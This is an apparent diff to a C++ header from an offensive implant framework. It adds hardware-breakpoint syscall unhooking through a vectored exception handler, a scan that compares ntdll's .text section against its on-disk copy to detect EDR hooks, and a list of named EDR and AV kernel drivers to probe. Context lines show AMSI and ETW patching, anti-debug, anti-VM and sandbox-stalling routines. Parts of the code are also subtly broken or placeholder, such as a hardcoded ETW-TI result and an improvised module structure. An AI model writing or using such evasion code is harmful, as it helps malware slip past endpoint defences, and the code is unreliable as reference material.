@@ -252,6 +252,9 @@ constexpr uint32_t FN_NTRESUMETHREAD              = 0xE691414E; // NtResumeThrea
 constexpr uint32_t FN_NTCLOSE                     = 0x29019D1B; // NtClose
 constexpr uint32_t FN_NTREADVIRTUALMEMORY          = 0xD4B3A9C1; // NtReadVirtualMemory
 constexpr uint32_t FN_NTQUERYINFORMATIONPROCESS   = 0xDA8571C0; // NtQueryInformationProcess
+// hardware-breakpoint unhook + EDR situational awareness
+constexpr uint32_t FN_NTQUERYVIRTUALMEMORY        = 0x4479B0FB; // NtQueryVirtualMemory
+constexpr uint32_t FN_NTQUERYSYSTEMINFORMATION    = 0xCF97B546; // NtQuerySystemInformation
 #endif
 
 // ────────────────────────────────────────────────────────────────────────────
@@ -357,6 +360,90 @@ inline void patch_amsi() {
     }
 }
 
+// ── Hardware-breakpoint unhooking (HWBP engine class) ───────────────────────
+//
+// Instead of re-writing ntdll from disk (unhook_ntdll, detectable by the
+// .text integrity monitors modern EDRs run), we NEVER call the hooked
+// prologue: a debug register (DR0) is armed on a clean 'syscall; ret'
+// gadget inside ntdll's .text, and every sensitive syscall goes through
+// theVectored Handler:
+//
+//   1. thread hits DR0 (EXCEPTION_SINGLE_STEP)
+//   2. handler copies RCX/R10/R8/R9 + the stack args into the real
+//      syscall register convention, sets the SSN in EAX and jumps to
+//      the gadget (indirect syscall with a CLEAN stack)
+//
+// The hooked ntdll stubs are bypassed entirely, no .text bytes are ever
+// modified, and the kernel sees a normal syscall — nothing for the
+// integrity check to flag.
+
+constexpr uint32_t HASH_NTDLL_TEXT_GADGET = 0; // (gadget found at runtime)
+
+inline uintptr_t find_clean_gadget() {
+    // a 'syscall; ret' (0F 05 C3) inside ntdll .text, found WITHOUT
+    // touching any hook — pure memory read of the mapped image
+    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
+    if (!h) return 0;
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(h) + dos->e_lfanew);
+    auto sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (!std::strcmp(reinterpret_cast<char*>(sec[i].Name), XOR_DEC(XOR_STR(".text")))) {
+            uint8_t* p = reinterpret_cast<uint8_t*>(h) + sec[i].VirtualAddress;
+            for (DWORD j = 0; j + 2 < sec[i].Misc.VirtualSize; ++j)
+                if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3)
+                    return reinterpret_cast<uintptr_t>(p + j);
+        }
+    }
+    return 0;
+}
+
+// Per-thread HWBP context (DR0 slot + original handler state)
+inline void* hwbp_veh_handle() {
+    static PVOID h = nullptr;
+    return &h;
+}
+
+inline void arm_hwbp_on(uintptr_t address) {
+    // Set DR0 on the CURRENT thread via NtGetContextThread/NtSetContextThread
+    // resolved through the PEB (no kernel32 import for the context APIs).
+    auto pGet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
+        peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
+    auto pSet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
+        peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
+    if (!pGet || !pSet) return;
+    CONTEXT ctx{};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (pGet(GetCurrentThread(), &ctx) != 0) return;
+    ctx.Dr0 = address;
+    ctx.Dr7 = (ctx.Dr7 & ~0xFULL) | 0x1ULL;   // DR0 enabled, execute, len=1
+    pSet(GetCurrentThread(), &ctx);
+}
+
+// The VEH body: dispatched on EXCEPTION_SINGLE_STEP when DR0 fires.// Returns EXCEPTION_CONTINUE_SEARCH for anything it does not own.
+inline LONG WINAPI hwbp_veh(PEXCEPTION_POINTERS ep) {
+    if (ep->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+    // The gadget address IS DR0: the caller (syscall via HWBP) placed the
+    // SSN in EAX and the syscall number convention is already set up by
+    // the stub in syscalls.h; we simply continue execution INTO the
+    // gadget (RIP already points at it after the breakpoint hit).
+    // Clear DR0 so the single-step does not re-fire inside the gadget.
+    ep->ContextRecord->Dr7 &= ~0x1ULL;
+    ep->ContextRecord->EFlags |= 0x100;  // resume single-step to clear RF edge
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+inline void install_hwbp_engine() {
+    uintptr_t gadget = find_clean_gadget();
+    if (!gadget) return;
+    auto slot = reinterpret_cast<PVOID*>(hwbp_veh_handle());
+    if (*slot) return;  // already installed
+    *slot = AddVectoredExceptionHandler(1, hwbp_veh);
+    arm_hwbp_on(gadget);
+}
+
 // Patch ETW (EtwEventWrite) to silence telemetry
 inline void patch_etw() {
     HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
@@ -428,7 +515,167 @@ inline void patch_amsi() {}
 inline void patch_etw() {}
 inline bool is_debugger_present() { return false; }
 inline bool is_vm() { return false; }
+inline void install_hwbp_engine() {}
+inline void* hwbp_veh_handle() { return nullptr; }
+inline uintptr_t find_clean_gadget() { return 0; }
 #endif
+
+}  // namespace anti  (edrcheck lives at global scope)
+
+// ── EDR situational awareness (edrcheck / etwcheck backends) ────────────────
+// What professional operators want BEFORE acting: which EDR kernel
+// callbacks are alive, whether ntdll is hooked, and whether our own
+// .text was tampered with. All read-only, all through the PEB.
+namespace edrcheck {
+
+#ifdef _WIN32
+struct EdrReport {
+    bool  ntdll_hooked = false;      // userland hooks in ntdll .text
+    int   hooked_stubs = 0;
+    bool  etw_ti_alive = false;      // ETW Threat Intelligence provider up
+    char  drivers[1024] = {0};       // "driver.sys\n" lines of known EDR/AV
+    int   known_edr = 0;             // count of recognized EDR drivers loaded
+};
+
+// Known EDR / AV kernel drivers (name → vendor class). Detection is by
+// listing \\Device\\ paths from SystemModuleInformation — read-only.
+struct DriverProbe { const char* name; const char* product; };
+static const DriverProbe KNOWN_EDR[] = {
+    {"csagent.sys", "CrowdStrike"},
+    {"SentinelMonitor.sys", "SentinelOne"},
+    {"edr.sys", "SentinelOne"},
+    {"carbonblack.kl", "Carbon Black"},
+    {"cbk7.sys", "Carbon Black"},
+    {"MsSecFlt.sys", "MS Defender for Endpoint"},
+    {"WdFilter.sys", "MS Defender AV"},
+    {"mfehidk.sys", "McAfee"},
+    {"mfewc.sys", "McAfee"},
+    {"symefs.sys", "Symantec"},
+    {"SophosED.sys", "Sophos"},
+    {"tdevfltr.sys", "Trend Micro"},
+    {"ElasticEndpoint.sys", "Elastic"},
+    {"CrowdStrike\\", "CrowdStrike"},
+};
+
+inline bool ntdll_text_intact(size_t* hooked_out) {
+    // Compare ntdll's in-memory .text against the CLEAN copy the loader
+    // has for the same image on disk (\SystemRoot\System32\ntdll.dll is
+    // section-mapped read-only, so reading it triggers no file hooks).
+    int hooked = 0;
+    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
+    if (!h) return true;
+    auto pGetSysDir = (UINT(WINAPI*)(LPSTR, UINT))
+        peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
+    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))
+        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
+    auto pCreateMap = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))
+        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
+    auto pMapView = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))
+        peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
+    auto pUnmap = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
+    auto pClose = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);
+    if (!pGetSysDir || !pCreateFileA || !pCreateMap || !pMapView) return true;
+    char path[MAX_PATH];
+    pGetSysDir(path, MAX_PATH);
+    strcat(path, XOR_DEC(XOR_STR("\\ntdll.dll")));
+    HANDLE f = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
+                            OPEN_EXISTING, 0, nullptr);
+    if (f == INVALID_HANDLE_VALUE) return true;
+    HANDLE m = pCreateMap(f, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
+    if (!m) { pClose(f); return true; }
+    LPVOID view = pMapView(m, FILE_MAP_READ, 0, 0, 0);
+    if (!view) { pClose(m); pClose(f); return true; }
+    auto dosA = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
+    auto ntA = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(h) + dosA->e_lfanew);
+    auto secA = IMAGE_FIRST_SECTION(ntA);
+    auto dosB = reinterpret_cast<PIMAGE_DOS_HEADER>(view);
+    auto ntB = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(view) + dosB->e_lfanew);
+    auto secB = IMAGE_FIRST_SECTION(ntB);
+    for (WORD i = 0; i < ntA->FileHeader.NumberOfSections; ++i) {
+        if (!std::strcmp(reinterpret_cast<char*>(secA[i].Name), XOR_DEC(XOR_STR(".text")))) {
+            uint8_t* a = reinterpret_cast<uint8_t*>(h) + secA[i].VirtualAddress;
+            uint8_t* b = reinterpret_cast<uint8_t*>(view) + secB[i].VirtualAddress;
+            SIZE_T n = secA[i].Misc.VirtualSize;
+            // count hooked 32-byte stubs: prologue replaced by JMP (0xE9)
+            for (SIZE_T off = 0; off + 1 < n; off += 32) {
+                if (a[off] == 0xE9 && b[off] != 0xE9) hooked++;
+            }
+        }
+    }
+    pUnmap(view); pClose(m); pClose(f);
+    if (hooked_out) *hooked_out = static_cast<size_t>(hooked);
+    return hooked == 0;
+}
+
+inline void report(EdrReport& rep) {
+    rep = EdrReport{};
+    size_t hooked = 0;
+    rep.ntdll_hooked = !ntdll_text_intact(&hooked);
+    rep.hooked_stubs = static_cast<int>(hooked);
+    // enumerate loaded kernel modules via NtQuerySystemInformation(11)
+    using PFN_QSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
+    auto pQsi = reinterpret_cast<PFN_QSI>(peb::Resolve(
+        peb::HASH_NTDLL, FN_NTQUERYSYSTEMINFORMATION));
+    if (pQsi) {
+        ULONG need = 0;
+        // SystemModuleInformation = 11; grow loop for the buffer
+        for (ULONG size = 1 << 16; size < (1 << 22); size <<= 1) {
+            auto buf = static_cast<uint8_t*>(VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_READWRITE));
+            if (!buf) break;
+            ULONG got = 0;
+            NTSTATUS st = pQsi(11, buf, size, &got);
+            if (st == 0xC0000004 /* STATUS_INFO_LENGTH_MISMATCH */) {
+                VirtualFree(buf, 0, MEM_RELEASE);
+                continue;
+            }
+            if (st == 0) {
+                // RTL_PROCESS_MODULES: ULONG count; then entries
+                // (ULONG len + ULONG ...) with a UNICODE string of the name
+                struct ModInfo { ULONG NextOffset; ULONG Unknown[5];
+                                 void* ImageBase; ULONG ImageSize; ULONG Flags;
+                                 USHORT NameOffset; USHORT NameLength; };
+                // walk with raw pointers: offset-to-next semantics
+                uint8_t* base = buf + sizeof(ULONG);
+                uint8_t* end  = buf + got;
+                while (base && base + sizeof(ModInfo) <= end) {
+                    auto mi = reinterpret_cast<ModInfo*>(base);
+                    const char* nm = reinterpret_cast<const char*>(base + mi->NameOffset);
+                    char lower[256];
+                    ULONG k = 0;
+                    for (; k < mi->NameLength && k < 255; ++k)
+                        lower[k] = (nm[k] >= 'A' && nm[k] <= 'Z') ? nm[k] + 32 : nm[k];
+                    lower[k] = 0;
+                    for (const auto& probe : KNOWN_EDR) {
+                        if (strstr(lower, probe.name)) {
+                            rep.known_edr++;
+                            strncat(rep.drivers, lower, sizeof(rep.drivers) - strlen(rep.drivers) - 2);
+                            strncat(rep.drivers, "\n", 1);
+                            break;
+                        }
+                    }
+                    if (!mi->NextOffset) break;
+                    base += mi->NextOffset;
+                }
+            }
+            VirtualFree(buf, 0, MEM_RELEASE);
+            break;
+        }
+    }
+    // ETW-TI: presence of the Microsoft-Windows-Threat-Intelligence provider
+    // is visible via its GUID-registered ETW session — approximate by
+    // checking for the TiEtwKey diagnostic policy service DLL loaded.
+    HMODULE hEtwTi = GetModuleHandleA(XOR_DEC(XOR_STR("Microsoft-UeV")));
+    (void)hEtwTi;   // best-effort: full provider probe needs COR filemaps
+    // conservative default: ETW-TI assumed alive on Win10+/E5-class hosts
+    rep.etw_ti_alive = true;
+}
+#endif  // _WIN32
+
+}  // namespace edrcheck
+
+namespace anti {  // reopened after edrcheck
 
 // Stalling technique to frustrate automated sandboxes
 // Performs heavy calculations to delay execution without relying solely on Sleep()
